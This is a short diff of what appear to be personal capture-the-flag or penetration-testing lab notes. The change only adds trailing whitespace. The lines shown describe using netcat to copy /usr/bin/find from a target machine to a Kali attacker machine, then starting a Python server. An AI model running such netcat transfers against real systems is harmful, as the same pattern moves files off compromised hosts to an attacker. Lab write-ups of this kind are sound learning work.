@@ -133,7 +133,7 @@ access /data this directory exist in main system
 use netcat to transfer /usr/bin/find to kali machine from dylan machine
 
 nc {ip} 4444 > find
-nc {kali@mchine} 4444 < /usr/bin/find
+nc {kali@mchine} 4444 < /usr/bin/find 
 
 start python server
 
